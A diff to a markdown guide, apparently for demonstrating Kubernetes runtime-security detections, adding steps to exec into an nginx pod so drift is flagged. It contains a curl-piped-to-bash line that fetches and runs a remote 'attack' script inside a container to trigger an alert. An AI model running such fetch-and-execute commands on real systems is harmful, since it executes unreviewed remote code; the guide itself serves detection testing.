@@ -284,12 +284,25 @@ ls | grep *.sh
 cat security-checks.sh
 ```
 
-Privileged Shell Spawned Inside Container
+## Privileged Shell Spawned Inside Container
 ```
 sh -c curl https://raw.githubusercontent.com/sysdiglabs/policy-editor-attack/master/run.sh | bash
 ```
 
-Drift Control:
+## Drift Control:
+
 ```
-kubectl exec -it pod/nginx -n drift-namespace -- sh
+kubectl create ns drift-control
 ```
+
+Create an Nginx pod within the drift-control namespace
+```
+kubectl run nginx -n drift-control --image=nginx --restart=Never
+```
+
+NB: Let it run for 24 hours before running exec session on pod
+```
+kubectl exec -it pod/nginx -n drift-control -- sh
+```
+
+This should be immediately flagged as unusual behaviour
